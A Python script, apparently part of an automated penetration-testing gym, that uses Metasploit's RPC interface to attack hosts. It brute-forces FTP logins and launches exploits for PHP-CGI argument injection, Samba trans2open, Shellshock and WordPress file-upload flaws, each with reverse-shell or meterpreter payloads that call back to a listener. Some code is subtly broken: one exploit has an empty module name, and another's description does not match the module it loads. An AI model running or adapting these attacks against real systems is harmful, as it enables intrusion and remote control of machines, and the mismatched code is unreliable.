#!/usr/bin/python3

"""
This module will test ssh logins on a range of machines and 
report successful logins. If you have loaded a database plugin
 and connected to a database this module will record successful
  logins and hosts so you can track your access.
"""

from pymetasploit3.msfrpc import MsfRpcClient
import sys
from configEnviroment import *
import time 
import csv 


LPORT = 4444

def ckeckResult(client):
    session = client.sessions.list.keys()
    #print(session)
    if len(session) == 0:
        #print("Exploit fallito")
        return -1
    lista_new_session = []
    trovata = False
    with open('session.csv', 'r+', encoding='UTF8', newline='') as f:
        reader = csv.reader(f, delimiter=',')
        someSession = False 
        for s in session:
            someSession = True
            for row in reader:
                if(str(s) == str(row[0])):
                    trovata = True
                    break
            if trovata == False:
                #print("Sessione non trovata",s)
                lista_new_session.append(s)
            trovata = False
        if someSession == False:
            #print("Exploit riuscito. Non ci sono sessioni attive")
            for s in session:
                writer = csv.writer(f)
                print(s)
                writer.writerow([s])
            return 0
        if(len(lista_new_session)==0):
            #print("Exploit non riuscito -No sessions ")
            return -1
        else:
            #print("Exploit riuscito-Nuova sessione aperta: ")
            for s in lista_new_session:
                #print(s)
                writer = csv.writer(f)
                writer.writerow([s])
            return 0


def IRCD_exploit(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-IRCD']
    else:
        return -1


def ftp_exploit(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-ftp']
    else:
        client=MsfRpcClient(PWD, port=55552)
        exploit = client.modules.use('auxiliary', 'scanner/ftp/ftp_login') 
        #print(exploit.description)
        exploit['RHOSTS']=conf_host[host_name]['IP']
        exploit['RPORT']=21
        exploit['USERPASS_FILE'] = '/home/user/Desktop/gym-pt/scripts/exploit/pwd.txt'
        exploit['VERBOSE'] = True
        var = exploit.execute()
        #print(var)
        if 'job_id' not in var or var['job_id']==None:
            print("Exploit fallito")
            return -1
        else:
            time.sleep(100)
            return ckeckResult(client)
        
        
"""
When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is 
vulnerable to an argument injection vulnerability. 
This module takes advantage of the -d flag to set php.ini 
directives to achieve code execution. From the advisory: 
"if there is NO unescaped '=' in the query string, the string 
is split on '+' (encoded space) characters, urldecoded, passed 
to a function that escapes shell metacharacters (the "encoded in 
a system-defined manner" from the RFC) and then passes them to 
the CGI binary." This module can also be used to exploit the 
plesk 0day disclosed by kingcope and exploited in the wild 
on June 2013.
.
"""

def php_exploit(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-cve']
    else:
        global LPORT
        client=MsfRpcClient(PWD, port=55552)
        exploit = client.modules.use('exploit', 'multi/http/php_cgi_arg_injection') 
        #print(exploit.description)
        exploit['RHOSTS']=conf_host[host_name]['IP']
        exploit['RPORT']=80
        payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
        payload['LHOST']= LHOST
        LPORT +=1
        #print(LPORT)
        payload['LPORT']= LPORT
        var = exploit.execute(payload=payload)
        #print(var)
        if var['job_id']==None:
            #print("Exploit fallito")
            return -1
        else:
            time.sleep(100)
            return ckeckResult(client)
        


"""
This exploits the buffer overflow found in Samba versions 2.2.0 
to 2.2.8. This particular module is capable of exploiting the flaw 
on x86 Linux systems that do not have the noexec stack option set. 
NOTE: Some older versions of RedHat do not seem to be vulnerable 
since they apparently do not allow anonymous access to IPC.
"""


def exploit_samba(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-samba']
    else:
        global LPORT
        client=MsfRpcClient(PWD, port=55552)
        exploit = client.modules.use('exploit', 'linux/samba/trans2open')
        exploit['RHOSTS']=conf_host[host_name]['IP']
        exploit['RPORT']=139
        payload = client.modules.use('payload', 'linux/x86/shell_reverse_tcp')
        payload['LHOST']= LHOST
        LPORT +=1
        #print(LPORT)
        payload['LPORT']= LPORT
        var = exploit.execute(payload=payload)
        #print(var)
        if var['job_id']==None:
            #print("Exploit fallito")
            return -1
        else:
            time.sleep(100)
            return ckeckResult(client)
        
    


def shellshock(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-shellshock']
    else:
        global LPORT
        client = MsfRpcClient(PWD, port=55552)
        exploit = client.modules.use('exploit', 'multi/http/apache_mod_cgi_bash_env_exec')

        exploit['RHOSTS']=conf_host[host_name]['IP']
        exploit['RPORT']="80"
        exploit['TARGETURI']="/cgi-bin/status"
        payload = client.modules.use('payload', 'linux/x86/shell/reverse_tcp')
        payload['LHOST'] = LHOST
        LPORT +=1
        #print(LPORT)
        payload['LPORT']= LPORT
        var = exploit.execute(payload=payload)
        #print(var)
        if var['job_id']==None:
            #print("Exploit fallito")
            return -1
        else:
            time.sleep(100)
            return ckeckResult(client)
        


"""
The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for 
WordPress allows remote attackers to upload and execute arbitrary 
PHP code because it renames an unsafe example elFinder connector 
file to have the .php extension. This, for example, allows attackers 
to run the elFinder upload (or mkfile and put) command to write PHP 
code into the wp-content/plugins/wp-file-manager/lib/files/ 
directory.
"""
def wordpress_exploit(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-fileManager']
    else:
        global LPORT
        client=MsfRpcClient(PWD, port=55552)
        exploit = client.modules.use('exploit', '') 
        #print(exploit.description)
        exploit['RHOSTS']=conf_host[host_name]['IP']
        exploit['RPORT']=80
        exploit['TARGETURI']='/blog'
        payload = client.modules.use('payload', 'php/meterpreter/reverse_tcp')
        payload['LHOST']= LHOST

        LPORT +=1
        #print(LPORT)
        payload['LPORT']= LPORT
        var = exploit.execute(payload=payload)
        #print(var)
        if var['job_id']==None:
            #print("Exploit fallito")
            return -1
        else:
            time.sleep(100)
            return ckeckResult(client)
        

"""
This module exploits an arbitrary PHP code upload in the WordPress 
Reflex Gallery version 3.1.3. The vulnerability allows for arbitrary 
file upload and remote code execution.
"""

def wp_reflex(host_name):
    if REAL == False:
        return conf_host[host_name]['Exploit']['Exploit-reflexGallery']
    else:
        global LPORT
        client=MsfRpcClient(PWD, port=55552)
        exploit = client.modules.use('exploit', 'multi/http/wp_file_manager_rce') 
        #print(exploit.description)
        exploit['RHOSTS']=conf_host[host_name]['IP']
        exploit['RPORT']=80
        exploit['TARGETURI']='/wordpress'
        payload = client.modules.use('payload', 'php/meterpreter/reverse_tcp')
        payload['LHOST']= LHOST
        LPORT +=1
        #print(LPORT)
        payload['LPORT']= LPORT
        var = exploit.execute(payload=payload)
        #print(var)
        if var['job_id']==None:
            #print("Exploit fallito")
            return -1
        else:
            time.sleep(100)
            return ckeckResult(client)
            
    













